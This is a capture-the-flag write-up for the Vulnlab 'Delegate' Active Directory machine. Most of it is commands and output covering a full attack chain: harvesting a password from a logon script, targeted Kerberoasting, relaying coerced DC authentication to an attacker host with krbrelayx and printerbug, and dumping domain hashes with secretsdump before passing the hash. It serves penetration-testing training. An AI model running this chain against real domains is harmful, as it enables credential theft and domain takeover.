---
title: Delegate - Vulnlab
date: 2024-06-30 13:16:36
tags: [vulnlab, Medium]
categories: vulnlab
keywords: 'Vulnlab, Medium, Windows'
description: Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.
cover: /images/vulnlab/delegate-vl/delegate_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.

# Enumeration

Let's start by doing our usual NMAP scans of the machine.

```
└─$ sudo nmap 10.10.87.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 00:50 EDT
Nmap scan report for delegate.vl (10.10.87.35)
Host is up (0.11s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
```

As stated before in the introduction, this machine is strictly AD. This means we won't need to enumerate any form of web server to gain access to a user list.

Let's run crackmapexec against the IP address to get the DNS name of the machine. Since this machine as ports 53 and 88, we can assume that it is a DC.

```
└─$ crackmapexec smb 10.10.87.35                                   
SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
```

We'll add the DNS name `dc1.delegate.vl` and `delegate.vl` to our `/etc/hosts` file.

Let's look at SMB to see if there are any files that are being hosted that we can exfil to our Kali machine.

```
└─$ smbclient -L 10.10.87.35 -N          

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share
```

Since we have null authentication enabled to SMB, we can enumerate the shares without needing credentials. While the default shares seem to be the only shares on this machine, let's still see if there's anything within `NETLOGON` or `SYSVOL`.

```
smb: \delegate.vl\scripts\> ls
  .                                   D        0  Sat Aug 26 08:45:24 2023
  ..                                  D        0  Sat Aug 26 05:45:45 2023
  users.bat                           A      159  Sat Aug 26 08:54:29 2023

5242879 blocks of size 4096. 1932408 blocks available
smb: \delegate.vl\scripts\> get users.bat
getting file \delegate.vl\scripts\users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

I found an interesting `users.bat` file in the startup script folder in `SYSVOL`. Let's pull this down to our local machine to see if it contains any information.

```
└─$ cat users.bat               
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator [...snip...]
```

As you can see from the above, it seems as though we have a user that is accessing a share in their startup script and accessing the backup share in the fileserver as an Administrator.

Assuming that this password is associated with this user, let's run crackmapexec to see if their password is a match.

```
└─$ crackmapexec smb 10.10.87.35 -u 'A.Briggs' -p '[...snip...]'
SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.87.35     445    DC1              [+] delegate.vl\A.Briggs:[...snip...]

└─$ crackmapexec ldap 10.10.87.35 -u 'A.Briggs' -p '[...snip...]'
SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
LDAP        10.10.87.35     389    DC1              [+] delegate.vl\A.Briggs:[...snip...]
```

It seems as though this is a valid domain user, who has access to both LDAP and SMB. Since we have access to LDAP, we can dump the domain as this user to view all of the domain objects. Let's use Bloodhound with the [Python ingestor](https://github.com/dirkjanm/BloodHound.py) to do this.

```
└─$ bloodhound-python -d 'delegate.vl' -u 'A.Briggs' -p '(A.BRIGGS PASSWORD)' -c all -ns 10.10.87.35 --zip
```

This should return a compressed archive containing all of the domain objects within the AD environment. We'll start up `neo4j` along with the `Bloodhound` GUI in order to view this in a graph.

# GenericWrite over N.Thompson

I did some initial enumeration of the domain objects, specifically the node for `A.Briggs` and what they have access to. It seems they have an interesting outbound object control on another node.

![](/images/vulnlab/delegate-vl/b.png)

From the screenshot above, it seems as though we have GenericWrite over the user `N.Thompson`.

This is much different than what we know about having GenericWrite or GenericAll on a node in the past. For some of my other writeups, we often had these privileges on a domain computer. The process for exploiting this against a domain user is much different - though it is simpler in my opinion.

If we have GenericWrite over a domain user object, there is a Kerberos exploit we could do. We could perform [targeted Kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast) on the domain object to request a TGS on behalf of them. This TGT will be encrypted with their password, which we can attempt to crack offline.

You can do this with the GitHub repository provided above. An example command can be found below.

```
└─$ python3 targetedKerberoast.py -d 'delegate.vl' -u 'A.Briggs' -p '(A.BRIGGS PASSWORD)' --request-user 'N.Thompson'
[*] Starting kerberoast attacks
[*] Attacking user (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$99c33fd94eb13970a6963667b7589c0a$29314c913d36f[...snip...]88b9ec9b2f6cd7e7f190edb308d9f
```

As you can see, this returned a valid TGS for the `N.Thompson` user. I did not need to update any of the dependencies needed for this, though it may be different for you.

Let's now use [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) with a hash-identifier of 13100 to attempt to decrypt this hash.

```
└─$ hashcat -a 0 -m 13100 nthompson.txt /usr/share/wordlists/rockyou.txt
......
f81d26ea14e743da90803146fc62ee86195ff78c872e0422bfb05fcb74c9ec6337b612aaa6338382da5ee166bffe0d275685ab7388b9ec9b2f6cd7e7f190edb308d9f:[...snip...]

Session..........: hashcat
Status...........: Cracked
```

As you can see from the above, the password was cracked successfully. We can now use this with crackmapexec to see if `N.Thompson` has any valid authentication to any other resources.

![](/images/vulnlab/delegate-vl/c.png)

It seems as though `N.Thompson` is a part of the `Remote Management Users` group. From my first guess, this means that they can PSRemote into the machine (meaning they have RDP access).

```
└─$ crackmapexec winrm 10.10.87.35 -u 'N.Thompson' -p '[...snip...]'
SMB         10.10.87.35     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
HTTP        10.10.87.35     5985   DC1              [*] http://10.10.87.35:5985/wsman
WINRM       10.10.87.35     5985   DC1              [+] delegate.vl\N.Thompson:[...snip...] (Pwn3d!)
```

It seems as though we have the ability to WinRM into the machine. Let's do so with `evil-winrm`.

```
└─$ evil-winrm --ip 10.10.87.35 -u 'N.Thompson' -p '(N.THOMPSON PASSWORD)'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami
delegate\n.thompson
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> hostname
DC1
```

The first user flag is within their home directory, denoted path as `C:\Users\N.Thompson\Desktop\user.txt`.

# SeEnableDelegationPrivilege and MAQs

I decided not to use Sliver for this, as it really isn't needed aside from transferring files to the machine easily. We'll be doing the rest of this solely from the WinRM session that we have.

If you run `whoami /priv`, you'll notice an interesting privilege that has been enabled for `N.Thompson`.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

It seems as though they have `SeEnableDelegationPrivilege`, which is a new privilege that I have not encountered before. This specific privilege allows us to enable the trusted asset for computer and user accounts.

You can find documentation on this privilege [here](https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html). Essentially, this privilege allows our user to impersonate other accounts or computers. The interesting thing about this privilege is that we can essentially set delegation properties to be configured on behalf of user and computer objects, hence the ability for us to `Enable` delegation.

Another interesting part about this is the fact that we can do this for computer accounts as well. While we don't have access to any machine accounts currently, our current user does have a property that isn't normally enabled to user accounts. That specific property is our MAQ, or `MachineAccountQuota`. This specific property allows us to create computer accounts within the context of our current users permissions.

```
└─$ crackmapexec ldap 10.10.87.35 -u 'N.Thompson' -p '[...snip...]' -M maq
SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
LDAP        10.10.87.35     389    DC1              [+] delegate.vl\N.Thompson:[...snip...]
MAQ         10.10.87.35     389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.10.87.35     389    DC1              MachineAccountQuota: 10
```

As you can see, it seems as though `N.Thompson` has a MAQ of 10. In order to add computer accounts to the domain, a minimum MAQ of 1 is required.

# Exploiting Unconstrained Delegation

At this point, the attack path becomes relatively clear. What we'll need to do is perform [Unconstrained Delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/):

* Create a computer account and add its DNS entry to `EXAMPLE.delegate.vl` to point to our attacker machine.
* Use `krbrelayx` to listen for incoming Kerberos keys and cache them accordingly.
* Coerce an authentication attempt from the DC and capture the authentication request with `krbrelayx`. (We can use `printerbug` for this)
* Use the captured DC service ticket to dump the domain secrets.

I found reference on how to do this locally from our Kali machine [here](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained). While I had given it a try to use `addcomputer` in Impacket's library to do this, the issue is that it does not add the sufficient SPNs that you need on the machine account to perform unconstrained delegation. The only SPN that you have the ability to add with `addcomputer` is `HTTP/(account).delegate.vl`.

The list of the required SPNs is below. I used [Powermad](https://github.com/Kevin-Robertson/Powermad) to get the specific attributes of a machine account I had configured.

```
HTTP/dazzad.delegate.vl
RestrictedKrbHost/dazzad
HOST/dazzad
RestrictedKrbHost/dazzad.delegate.vl
HOST/dazzad.delegate.vl
```

Luckily enough, when you add a machine account via Powermad, it should add these SPNs for you. There is also an additional SPN identifier that we'll need to have to ensure that the delegation rights are set correctly on the account.

Let's first start by creating the computer account through WinRM.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> New-MachineAccount -MachineAccount dazzad -Password $(ConvertTo-SecureString 'DazPassword123@' -AsPlainText -Force)
```

Next, we'll add the SPNs to the machine account so that it can properly exploit the delegation.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> Set-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Value HTTP/dazzad.delegate.vl -Append
[+] Machine account dazzad attribute ServicePrincipalName appended

*Evil-WinRM* PS C:\Users\N.Thompson\Documents> Set-MachineAccountAttribute -MachineAccount dazzad -Attribute userAccountControl -Value 528384
[+] Machine account daz attribute userAccountControl updated
```

We can verify our changes to the machine account by running `Get-MachineAccountAttribute` against the machine account we created.

```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> Get-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Verbose
Verbose: [+] Domain Controller = DC1.delegate.vl
Verbose: [+] Domain = delegate.vl
Verbose: [+] Distinguished Name = CN=dazzad,CN=Computers,DC=delegate,DC=vl
HTTP/dazzad.delegate.vl
RestrictedKrbHost/dazzad
HOST/dazzad
RestrictedKrbHost/dazzad.delegate.vl
HOST/dazzad.delegate.vl
```

Now that we have the respective SPNs set for this exploit, we can move back to our Kali machine for the rest of the exploit.

We'll need to add the LDAP record to `delegate.vl` to ensure that when we force it to authenticate to our machine account, it will redirect back to our MITM `krbrelayx` handler.

```
└─$ python3 krbrelayx/dnstool.py -u 'delegate.vl\dazzad$' -p 'DazPassword123@' -r DAZZAD.delegate.vl -d (KALI IP) --action add -dns-ip 10.10.92.191 dc1.delegate.vl                        
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Now that all of that is set, we can start our `krbrelayx` listener to listen for incoming requests.

```
└─$ python3 krbrelayx/krbrelayx.py --krbsalt 'DELEGATE\DAZ$' --krbpass 'DazPassword123@'
```

We'll then use `printerbug` to exploit the authentication coercion. This should force the DC to authenticate to our machine account, meaning the Kerberos TGT used to access our fake machine will be cached during the authentication exchange.

```
└─$ python3 krbrelayx/printerbug.py delegate.vl/'DAZ$':'DazPassword123@'@dc1.delegate.vl DAZZAD.delegate.vl
[*] Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

While we do get an `access_denied` error, if you look back at our `krbrelayx` listener - it should have received the authentication attempt and cached the DC's service ticket in a `.ccache` file.

```
[*] Setting up DNS Server
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.92.191
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

Now that we have the service ticket for the DC, we can import this into our Kerberos authentication global variable to dump the respective secrets. I opted to rename the ticket file just so that the special characters don't interfere with the global variable's interpretation of the file.

```
└─$ cp 'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' dc.ccache

└─$ export KRB5CCNAME=dc.ccache
```

We can now dump the secrets of the DC with our ticket using `secretsdump`.

```
└─$ impacket-secretsdump -k dc1.delegate.vl
......
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::
```

If you have done all of the required steps, you should have the NT hash for the Administrator user. We can now use this to login to DC via WinRM.

```
└─$ crackmapexec winrm 10.10.92.191 -u 'Administrator' -H '[...snip...]'
SMB         10.10.92.191    5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
HTTP        10.10.92.191    5985   DC1              [*] http://10.10.92.191:5985/wsman
WINRM       10.10.92.191    5985   DC1              [+] delegate.vl\Administrator:[...snip...] (Pwn3d!)
```

```
└─$ evil-winrm --ip 10.10.92.191 -u 'Administrator' -H '[...snip...]'

Evil-WinRM shell v3.5
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
VL[...snip...]
```

Now that we have read the root flag and have access via WinRM as the Administrator user, we have successfully completed this machine!

# Conclusion

This machine specifically was difficult (for priv esc) as it involved exploiting unconstrained delegation REMOTELY. I've only exploited unconstrained delegation between machines, to which one of them I had access as SYSTEM. This was something new to learn, and the `MachineAccountQuota` attribute is something that is definitely helpful as part of the exploit process.

Big thanks to `geiseric` for creating this machine.

# Resources

https://github.com/dirkjanm/BloodHound.py
https://github.com/ShutdownRepo/targetedKerberoast
https://hashcat.net/wiki/doku.php?id=example_hashes
https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html
https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained
https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota
https://github.com/Kevin-Robertson/Powermad
